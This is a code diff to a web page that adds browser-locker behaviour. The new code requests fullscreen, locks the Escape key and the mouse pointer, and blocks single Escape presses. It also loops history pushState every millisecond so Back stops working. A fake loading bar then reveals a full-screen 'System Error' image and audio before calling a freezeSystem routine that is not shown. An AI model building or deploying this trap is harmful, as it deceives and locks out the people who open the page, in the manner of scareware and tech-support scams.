@@ -10,7 +10,6 @@
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
         #bar-outer { width: 80%; height: 40px; border: 2px solid #00e5ff; margin-top: 20px; }
         #bar-inner { width: 0%; height: 100%; background: #00e5ff; box-shadow: 0 0 20px #00e5ff; }
-        /* Style for the error image */
         #error-image { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 2000; }
     </style>
 </head>
@@ -25,45 +24,59 @@
         <div id="bar-outer"><div id="bar-inner"></div></div>
     </div>
 
-    <!-- Error Image Element -->
     <img id="error-image" src="error2.png" alt="System Error">
 
     <script>
         async function engage() {
             const doc = document.documentElement;
+
+            // 1. Enter Fullscreen (Required for Keyboard Lock)
             if (doc.requestFullscreen) await doc.requestFullscreen();
-            
+
+            // 2. Request Keyboard Lock for Escape
+            // This forces the "Hold Escape to Exit" behavior in Chromium browsers
+            if (navigator.keyboard && navigator.keyboard.lock) {
+                await navigator.keyboard.lock(["Escape"]);
+            }
+
+            // 3. Pointer Lock (Traps Mouse)
+            if (doc.requestPointerLock) doc.requestPointerLock();
+
             document.getElementById('start-screen').style.display = 'none';
             const overlay = document.getElementById('loading-overlay');
             overlay.style.display = 'flex';
 
-            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 1);
+            // Prevent single Esc press from doing anything else
+            window.addEventListener('keydown', (e) => {
+                if (e.key === "Escape") e.preventDefault();
+            }, true);
 
+            // History Loop (Prevents Back button)
+            setInterval(() => {
+                window.history.pushState(null, "", window.location.href);
+            }, 1);
+
+            // Loading Animation
             let p = 0;
             const bar = document.getElementById('bar-inner');
             const loadInt = setInterval(() => {
-                p += 0.5; // Faster for testing
+                p += 0.2;
                 bar.style.width = p + "%";
                 if (p >= 100) {
                     clearInterval(loadInt);
-                    triggerErrorMedia(); // New trigger function
+                    triggerErrorMedia();
                 }
             }, 10);
         }
 
         function triggerErrorMedia() {
-            // 1. Hide the loading overlay
             document.getElementById('loading-overlay').style.display = 'none';
-
-            // 2. Show the error image
             const errImg = document.getElementById('error-image');
             errImg.style.display = 'block';
 
-            // 3. Play the error audio
             const audio = new Audio('error.mp3');
-            audio.play().catch(e => console.log("Audio play blocked:", e));
+            audio.play().catch(e => console.log("Audio blocked:", e));
 
-            // 4. Continue to system freeze
             setTimeout(freezeSystem, 1000); 
         }
 
